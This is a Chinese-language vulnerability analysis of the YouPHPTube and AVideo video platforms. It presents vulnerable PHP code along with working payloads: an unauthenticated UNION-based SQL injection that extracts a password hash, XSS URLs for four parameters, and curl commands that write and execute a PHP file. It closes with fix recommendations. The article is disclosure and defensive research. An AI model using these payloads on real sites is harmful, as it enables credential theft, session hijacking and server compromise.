![](https://image.3001.net/images/20210131/1612077228_601658acd7b4f8c9384a1.jpg!small)

## 关于YouPHPTube

YouPHPTube，又名AVideo，是一款开源的视频播放平台，这两个项目都基于相同的源代码开发。在这篇文章中，我们将对YouPHPTube <=
7.8版本和AVideo <= 10.0中的多个安全漏洞进行分析。

## 问题描述

Synacktiv的研究人员在YouPHPTube和AVideo项目中发现了多个安全漏洞，而这些安全漏洞都是由于缺乏对用户输入数据进行过滤清洗所导致的：

> 存在一个未经身份验证的SQL注入漏洞，攻击者可利用该漏洞从数据库中提取敏感数据，比如说密码哈希，并允许未经身份验证的用户提权为管理员身份。
>
> 存在多个跨站脚本漏洞（XSS），攻击者可利用这些漏洞窃取管理员的会话Cookie或以管理员权限执行任意操作。
>
> 一个文件写入漏洞，将允许攻击者在目标服务器上以管理员权限执行任意代码。

## 受影响版本

YouPHPTube项目 <= 7.8版本：【[ _源码获取_](https://github.com/WWBN/AVideo)】

AVideo项目 <= 10.0版本：【[ _源码获取_](https://github.com/alnux/YouPHPTube)】

## SQL注入漏洞分析

YouPHPTube和AVideo项目没有对用户的输入数据$_GET['catName']进行适当的过滤和清晰，未经身份验证的远程攻击者可以向存在漏洞的应用程序注入SQL代码来从数据库中提取敏感数据。下面显示的是getVideo()函数中的漏洞代码：

    
    
    $sql .= " AND (c.clean_name = '{$_GET['catName']}' OR c.parentId IN (SELECT cs.id from
    
    categories cs where cs.clean_name = '{$_GET['catName']}' ))";

如果没有适当的数据清洗和过滤，那么$_GET['catName']将可以被用来注入SQL请求字符串，应用程序只会检查并移除用户输入数据中的引号，那么未经身份验证的用户就可以通过使用编码的“\”来获取MySQL错误消息：

    
    
    GET /feed/?catName=%5c HTTP/1.1
    
    [...]
    
    HTTP/1.1 200 OK
    
    [...]
    
    SELECT u.*, v.*, c.iconClass, c.name as category, c.clean_name as
    
    clean_category,c.description as category_description, v.created as videoCreation,
    
    v.modified as videoModified, (SELECT count(id) FROM likes as l where l.videos_id = v.id
    
    AND `like` = 1 ) as likes, (SELECT count(id) FROM likes as l where l.videos_id = v.id AND
    
    `like` = -1 ) as dislikes FROM videos as v LEFT JOIN categories c ON categories_id = c.id
    
    LEFT JOIN users u ON v.users_id = u.id WHERE 1=1 AND u.status = 'a' AND (SELECT
    
    count(id) FROM videos_group_view as gv WHERE gv.videos_id = v.id ) = 0 AND v.status IN
    
    ('a','xmp4','xwebm','xmp3','xogg') AND (c.clean_name = '\' OR c.parentId IN (SELECT cs.id
    
    from categories cs where cs.clean_name = '\' )) ORDER BY v.created DESC LIMIT 0, 50 \
    
    nError : (1064) You have an error in your SQL syntax; check the manual that corresponds to
    
    your MySQL server version for the right syntax to use near '\' )) ORDER BY v.created DESC
    
    LIMIT 0, 50' at line 1

接下来，攻击者就可以使用编码的“\”来转义并利用该漏洞：

    
    
    GET /feed/?catName=)%23%5c HTTP/1.1
    
    [...]

此时，攻击者发送的请求就会变成有效的MySQL查询：

    
    
    SELECT u.*, v.*, c.iconClass, c.name as category, c.clean_name as
    
    clean_category,c.description as category_description, v.created as videoCreation,
    
    v.modified as videoModified, (SELECT count(id) FROM likes as l where l.videos_id = v.id
    
    AND `like` = 1 ) as likes, (SELECT count(id) FROM likes as l where l.videos_id = v.id AND
    
    `like` = -1 ) as dislikes FROM videos as v LEFT JOIN categories c ON categories_id = c.id
    
    LEFT JOIN users u ON v.users_id = u.id WHERE 1=1 AND u.status = 'a' AND (SELECT
    
    count(id) FROM videos_group_view as gv WHERE gv.videos_id = v.id ) = 0 AND v.status IN
    
    ('a','xmp4','xwebm','xmp3','xogg') AND (c.clean_name = ')#\' OR c.parentId IN (SELECT cs.id
    
    from categories cs where cs.clean_name = ')#\' )) ORDER BY v.created DESC LIMIT 0, 50

接下来，攻击者就可以使用UNION MySQL语句来利用该漏洞从数据库的users表中获取用户密码了。

 **AVideo项目 <= 10.0版本：**

    
    
    GET /feed/?catName=)
    
    +UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
    
    ,30,31,
    
    (select+password+from+users+limit+0,1),33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,5
    
    0,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78%23%5c
    
    HTTP/1.1
    
    [...]
    
    HTTP/1.1 200 OK
    
    […]
    
    <title>756b4b2b734f5568096daf16516975d7</title>
    
    […]

 **YouPHPTube项目 <= 7.8版本：**

    
    
    GET /youphptube/YouPHPTube-master/feed/?catName=)
    
    +UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
    
    ,30,
    
    (select+password+from+users+limit+0,1),32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,4
    
    9,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73%23%5c HTTP/1.1
    
    […]
    
    HTTP/1.1 200 OK
    
    […]
    
    <title>756b4b2b734f5568096daf16516975d7</title>
    
    […]

## 跨站脚本漏洞XSS分析

未经身份验证的用户将能够通过u、video、redirectUri和searchPhrase这几个变量注入HTML和JavaScript代码。远程攻击者可以利用这个漏洞窃取会话Cookie并使用管理员权限执行任意操作。

 **在YouPHPTube项目 <= 7.8版本中的view/userLogin.php文件内：**

    
    
    print isset($_GET['redirectUri']) ? $_GET['redirectUri'] : "";

上述代码允许任意用户通过使用下列URL样例来触发XSS漏洞：

    
    
    http://<target>/signUp?redirectUri=%22%3E%3Cscript%3Ealert(111)%3C%2fscript%3E

 **在AVideo项目 <= 10.0版本中的view/channels.php文件内：**

    
    
    echo @$_GET['searchPhrase'];

上述代码允许任意用户通过使用下列URL样例来触发XSS漏洞：

    
    
    http://<target>/channels?searchPhrase=test%22%3e%3cscript%3ealert(1)%3c%2fscript%3e

 **在这两个项目中的view/videosList.php文件内：**

    
    
    $videoName = "";
    
    if (!empty($video['clean_title'])) {
    
     $videoName = $video['clean_title'];
    
    } else if (!empty($_GET['videoName'])) {
    
     $videoName = $_GET['videoName'];
    
    }
    
    […]
    
    var urlList = "<?php echo $global['webSiteRootURL']; ?>videosList/<?php echo
    
    addslashes($catLink); ?>video/<?php echo addslashes($videoName); ?>" + page + query;

上述代码允许任意用户通过使用下列URL样例来触发XSS漏洞：

    
    
    http://<target>/videosList/video/%253c%252fscript%253e%253cscript%253ealert%25281%2529%253c%252fscript%253e/page/1

 **在这两个项目中的plugin/Live/view/modeYoutubeLive.php文件内：**

    
    
    $u = new User(0, $_GET['u'], false);
    
    [...]
    
    $name = $u→getNameIdentificationBd();
    
    $name = "<a href='" . User::getChannelLink($user_id) . "' class='btn btn-xs btndefault'>{$name} " . User::getEmailVerifiedIcon($user_id) . "</a>";
    
    $video['creator'] = '<div class="pull-left"><img src="' . User::getPhoto($user_id) . '"
    
    alt="User Photo" class="img img-responsive img-circle" style="max-width: 40px;"/></div><div
    
    class="commentDetails" style="margin-left:45px;"><div class="commenterName textmuted"><strong>' . $name . '</strong><br>' . $subscribe . '</div></div>';
    
    […]
    
    <div class="col-xs-12 col-sm-12 col-lg-12"><?php echo $video['creator']; ?></div>
    
    […]

上述代码允许任意用户通过使用下列URL样例来触发XSS漏洞：

    
    
    http://<target>/plugin/Live/?u=%3Cscript%3Ealert(66)%3C%2fscript%3E

## 文件写入漏洞分析

拥有管理员权限的用户可以在这两个项目中使用flag和code变量向目标服务器的文件系统中写入任意文件，存在漏洞的代码文件为locale/save.php：

    
    
    $file = $dir.strtolower($_POST['flag']).".php";
    
    $myfile = fopen($file, "w") or die("Unable to open file!");
    
    if (!$myfile) {
    
     $obj->status = 0;
    
     $obj->error = __("Unable to open file!");
    
     die(json_encode($obj));
    
    }
    
    $txt = "<?php\nglobal \$t;\n";
    
    fwrite($myfile, $txt);
    
    fwrite($myfile, $_POST['code']);
    
    fclose($myfile);
    
    echo json_encode($obj);

这个漏洞允许管理员用户在目标文件系统中执行任意命令并使用下列命令触发该漏洞：

    
    
    $ curl -kis 'http://<target>/locale/save.php' -H 'Cookie:
    
    09b9117edc20bc1c555739155c0eb1bd=9jpn05830lp2f7s9atqbs9kbc1;' --data
    
    'flag=testfile2&code=system(id);'

接下来：

    
    
    $ curl -kis 'http://<target>/locale/testfile2.php' -H 'Cookie:
    
    09b9117edc20bc1c555739155c0eb1bd=9jpn05830lp2f7s9atqbs9kbc1;'
    
    HTTP/1.1 200 OK
    
    Date: Sat, 21 Nov 2020 05:20:55 GMT
    
    Server: Apache
    
    X-Powered-By: PHP/7.4.11
    
    Cache-Control: max-age=1, private, must-revalidate
    
    Expires: Sat, 21 Nov 2020 05:20:56 GMT
    
    Content-Length: 49
    
    Content-Type: text/html; charset=UTF-8
    
    uid=81(apache) gid=81(apache) groupes=81(apache)

## 解决方案

目前官方还没有正式给出针对这些安全漏洞的解决方案，但是我们建议广大开发人员在处理SQL查询之前对$catName输入数据进行清洗和过滤来避免SQL注入的情况。

使用[
_htmlentities函数_](http://php.net/htmlentities)对searchPhrase、u和redirectUri进行过滤和清晰，可以避免HTML和JavaScript注入的情况。

最后，应该禁止在没有经过文件类型检测的情况下通过flag或code参数进行服务器端文件写入，哪怕是管理员也不应该具备这种权限。

